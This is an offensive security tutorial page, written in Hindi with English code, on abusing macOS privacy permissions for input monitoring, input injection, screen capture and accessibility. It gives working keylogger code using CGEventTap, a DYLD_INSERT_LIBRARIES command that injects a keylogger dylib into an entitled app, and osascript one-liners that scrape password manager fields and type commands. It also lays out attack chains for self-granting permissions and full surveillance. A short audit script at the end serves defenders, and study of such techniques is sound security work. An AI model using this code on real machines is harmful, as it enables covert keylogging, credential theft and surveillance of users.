# macOS Input Monitoring, Screen Capture और Accessibility Abuse

{{#include ../../../banners/hacktricks-training.md}}

## अवलोकन

तीन संबंधित TCC services यह नियंत्रित करती हैं कि applications उपयोगकर्ता के desktop session को कैसे observe और interact कर सकती हैं:

| TCC Service | Permission | Capability |
|---|---|---|
| `kTCCServiceListenEvent` | **Input Monitoring** | पूरे system में सभी keyboard और mouse events पढ़ना (keylogging) |
| `kTCCServicePostEvent` | **Input Injection** | synthetic keyboard और mouse events inject करना |
| `kTCCServiceScreenCapture` | **Screen Capture** | display buffer पढ़ना, screenshots लेना, screen record करना |
| `kTCCServiceAccessibility` | **Accessibility** | AXUIElement API के माध्यम से अन्य applications को control करना, UI elements पढ़ना |

ये permissions macOS पर **सबसे खतरनाक combination** हैं — साथ मिलकर ये प्रदान करती हैं:
- हर keystroke की full keylogging (passwords, messages, credit cards)
- दिखाई देने वाली सभी सामग्री की screen recording
- synthetic input injection (buttons पर click करना, dialogs approve करना)
- physical access के समान complete GUI control

---

## Input Monitoring (kTCCServiceListenEvent)

### यह कैसे काम करता है

macOS processes को Quartz event system से input events intercept करने की अनुमति देने के लिए **`CGEventTap` API** का उपयोग करता है। ListenEvent permission वाला process एक event tap बना सकता है, जो target application तक पहुँचने से पहले या बाद में **हर keyboard और mouse event** प्राप्त करता है।<sup>[[1]](#references)</sup>
```objc
// Create an event tap that captures all key-down events
CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) | CGEventMaskBit(kCGEventFlagsChanged);

CFMachPortRef tap = CGEventTapCreate(
kCGSessionEventTap,        // Tap at the session level (all apps)
kCGHeadInsertEventTap,     // Insert before the event reaches the app
kCGEventTapOptionListenOnly, // Listen only (don't modify events)
mask,
eventCallback,             // Callback receives every matching event
NULL
);

// The callback receives every keyDown in the entire session:
CGEventRef eventCallback(CGEventTapProxy proxy, CGEventType type,
CGEventRef event, void *userInfo) {
UniChar chars[4];
UniCharCount len;
CGEventKeyboardGetUnicodeString(event, 4, &len, chars);
// chars now contains what the user typed
return event;
}
```
### Entitled Binaries ढूँढना
```bash
# Find processes with input monitoring TCC grants
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"

# System-level grants
sudo sqlite3 /Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceListenEvent';"
```
### Attack: Code Injection के माध्यम से Keylogging

यदि ListenEvent permission वाले binary में **disabled library validation** भी हो या **DYLD environment variables** की अनुमति हो, तो attacker ऐसा dylib inject कर सकता है जो CGEventTap register करता है:
```bash
# Check if the target allows code injection
codesign -d --entitlements - /path/to/input-monitor-app 2>&1 | \
grep -E "allow-dyld|disable-library-validation"

# If both are present, inject a keylogger dylib:
DYLD_INSERT_LIBRARIES=/tmp/keylogger.dylib /path/to/input-monitor-app
```
The injected dylib target के ListenEvent TCC grant को inherit करती है और सभी keystrokes capture करती है।

### Attack: Credential Harvesting

एक sophisticated keylogger active application के साथ keystrokes को correlate कर सकता है:
```objc
// Get the frontmost application to contextualize keystrokes
NSRunningApplication *frontApp = [[NSWorkspace sharedWorkspace] frontmostApplication];
NSString *appName = frontApp.localizedName;

// If appName is "Safari" or "Chrome" and the URL bar contains a login page,
// the next typed sequence is likely a password
```
---

## Input Injection (kTCCServicePostEvent)

### यह कैसे काम करता है

PostEvent permission, **`kCGEventTapOptionDefault`** के साथ event tap बनाने की अनुमति देता है (events को modify/inject कर सकता है), न कि ListenOnly के साथ।<sup>[[1]](#references)</sup> इससे सक्षम होता है:
```objc
// Inject a keystroke
CGEventRef keyDown = CGEventCreateKeyboardEvent(NULL, kVK_Return, true);
CGEventRef keyUp = CGEventCreateKeyboardEvent(NULL, kVK_Return, false);
CGEventPost(kCGSessionEventTap, keyDown);
CGEventPost(kCGSessionEventTap, keyUp);

// Inject a mouse click at coordinates
CGEventRef click = CGEventCreateMouseEvent(NULL, kCGEventLeftMouseDown,
CGPointMake(100, 200),
kCGMouseButtonLeft);
CGEventPost(kCGSessionEventTap, click);
```
### Attack: Automated TCC Prompt Approval

PostEvent के साथ, attacker TCC permission dialogs में **"Allow" पर क्लिक करने का simulation** कर सकता है:
```bash
# Using cliclick (if available) or direct CGEvent injection:
# 1. Trigger a TCC prompt for the malware
# 2. Wait for the dialog to appear
# 3. Inject a mouse click on the "Allow" button coordinates
# 4. Malware now has the requested permission
```
---

## स्क्रीन कैप्चर (kTCCServiceScreenCapture)

### यह कैसे काम करता है

Screen capture permission निम्न का उपयोग करके display buffer को पढ़ने की अनुमति देती है:
- **`CGWindowListCreateImage`** — किसी भी window या पूरी screen को capture करना
- **`ScreenCaptureKit`** (macOS 12.3+) — screen content को stream करने के लिए modern API<sup>[[3]](#references)</sup>
- **`CGDisplayStream`** — hardware-accelerated screen capture
```objc
// Capture the entire main display
CGImageRef screenshot = CGWindowListCreateImage(
CGRectInfinite,
kCGWindowListOptionOnScreenOnly,
kCGNullWindowID,
kCGWindowImageDefault
);
// screenshot contains everything visible on screen
```
### Screen Capture Clients ढूँढना
```bash
# TCC database query
sqlite3 ~/Library/Application\ Support/com.apple.TCC/TCC.db \
"SELECT client, auth_value FROM access WHERE service='kTCCServiceScreenCapture';"

# Using the scanner
sqlite3 /tmp/executables.db "
SELECT path FROM executables WHERE tccPermsStr LIKE '%kTCCServiceScreenCapture%';"
```
### Attack: OCR के ज़रिए Credential Capture

एक injected screen capture process समय-समय पर frames capture कर सकता है और passwords निकालने के लिए OCR का उपयोग कर सकता है:
```bash
# Basic screen capture from a process with the TCC grant
screencapture -x /tmp/screen.png

# Capture a specific window (by window ID)
screencapture -x -l <windowID> /tmp/window.png
```
> [!WARNING]
> **macOS Sonoma** से शुरू होकर, screen capture menu bar में एक **persistent indicator** दिखाता है। पुराने versions में screen recording पूरी तरह silent हो सकती थी। हालांकि, एक संक्षिप्त single-frame capture अभी भी users की नजर से बच सकता है।

### Attack: Session Recording

Continuous screen recording user के session का complete replay प्रदान करती है:
```objc
// Using ScreenCaptureKit for streaming capture (macOS 12.3+)
// This captures frames continuously with minimal CPU impact
SCStreamConfiguration *config = [[SCStreamConfiguration alloc] init];
config.width = 1920;
config.height = 1080;
config.minimumFrameInterval = CMTimeMake(1, 5); // 5 FPS
// Stream captures everything: passwords, documents, private messages
```
---

## Accessibility (kTCCServiceAccessibility)

### यह कैसे काम करता है

Accessibility एक्सेस **AXUIElement API** के माध्यम से अन्य applications पर नियंत्रण प्रदान करता है।<sup>[[2]](#references)</sup> Accessibility वाले process में ये क्षमताएँ हो सकती हैं:

1. किसी भी application में किसी भी UI element को **Read** करना (text fields, labels, buttons, menus)
2. बटन पर **Click** करना और controls के साथ interact करना
3. किसी भी text field में text **Type** करना
4. menus और dialogs में **Navigate** करना
5. किसी भी running application से प्रदर्शित data को **Scrape** करना
```objc
// Get the frontmost application
AXUIElementRef app = AXUIElementCreateApplication(pid);

// Get its windows
CFArrayRef windows;
AXUIElementCopyAttributeValue(app, kAXWindowsAttribute, (CFTypeRef *)&windows);

// Read a text field's value
AXUIElementRef textField = /* find the text field */;
CFTypeRef value;
AXUIElementCopyAttributeValue(textField, kAXValueAttribute, &value);
// value contains whatever text is displayed in the field
```
### Attack: Self-Granting TCC Permissions

सबसे खतरनाक Accessibility abuse है **अपने malware को अतिरिक्त permissions देने के लिए System Settings में नेविगेट करना**।<sup>[[4]](#references)</sup>
```bash
# Using osascript with accessibility access:
# Navigate to Privacy & Security > Full Disk Access
osascript -e '
tell application "System Settings"
activate
delay 1
end tell
tell application "System Events"
tell process "System Settings"
-- Navigate to Privacy & Security
-- Click the lock to authenticate
-- Toggle on Full Disk Access for the malware
end tell
end tell'
```
### Attack: Cross-Application Data Scraping
```bash
# Read data from any application's UI
osascript -e 'tell application "System Events" to get value of text field 1 of window 1 of process "Safari"'

# Get all visible window titles
osascript -e 'tell application "System Events" to get name of every window of every process whose visible is true'

# Scrape password manager display (if unlocked and visible)
osascript -e 'tell application "System Events" to get value of every text field of window 1 of process "1Password"'
```
### Attack: Automated User Actions
```bash
# Click a specific UI element
osascript -e '
tell application "System Events"
tell process "Finder"
click button "Allow" of window 1
end tell
end tell'

# Type text into focused field
osascript -e 'tell application "System Events" to keystroke "malicious command"'
osascript -e 'tell application "System Events" to key code 36' -- Press Enter
```
---

## आक्रमण शृंखलाएँ

### शृंखला: Input Monitoring + Screen Capture = पूर्ण निगरानी
```
1. Inject into binary with ListenEvent + ScreenCapture
2. CGEventTap captures all keystrokes
3. Periodic screen captures provide visual context
4. Correlate: keystroke timing + active window + screen content
5. Result: passwords, private messages, financial data
```
### Accessibility + PostEvent = पूर्ण रिमोट नियंत्रण
```
1. Inject into binary with Accessibility + PostEvent
2. Use AXUIElement to read current screen state
3. Use CGEventPost to inject keystrokes and clicks
4. Navigate System Settings to grant more permissions
5. Open Terminal, type commands as if the user did it
6. Result: equivalent to physical keyboard/mouse access
```
### Chain: Accessibility → Self-Grant Camera/Mic → निगरानी
```
1. Start with only Accessibility permission
2. Open System Settings > Privacy & Security > Camera
3. Use accessibility API to toggle camera access for malware
4. Repeat for Microphone, Screen Recording, Full Disk Access
5. Malware now has full surveillance capabilities
6. Result: one TCC permission escalates to total control
```
---

## Detection और Enumeration
```bash
#!/bin/bash
echo "=== TCC Input/Screen/Accessibility Audit ==="

for db in "$HOME/Library/Application Support/com.apple.TCC/TCC.db" "/Library/Application Support/com.apple.TCC/TCC.db"; do
echo -e "\n[*] Database: $db"
for svc in kTCCServiceListenEvent kTCCServicePostEvent kTCCServiceScreenCapture kTCCServiceAccessibility; do
echo "  $svc:"
sqlite3 "$db" "SELECT '    ' || client || ' (auth=' || auth_value || ')' FROM access WHERE service='$svc' AND auth_value=2;" 2>/dev/null
done
done

echo -e "\n[*] Processes with injectable + input monitoring:"
sqlite3 /tmp/executables.db "
SELECT path FROM executables
WHERE tccPermsStr LIKE '%kTCCServiceListenEvent%'
AND (noLibVal=1 OR allowDyldEnv=1);" 2>/dev/null
```
## References

- [1] [Apple Developer — Event Taps](https://developer.apple.com/documentation/coregraphics/quartz_event_services)
- [2] [Apple Developer — Accessibility API](https://developer.apple.com/documentation/applicationservices/axuielement_h)
- [3] [Apple Developer — ScreenCaptureKit](https://developer.apple.com/documentation/screencapturekit)
- [4] [Objective-See — macOS पर Synthetic events और user-interface security](https://objective-see.org/blog/blog_0x36.html)
{{#include ../../../banners/hacktricks-training.md}}
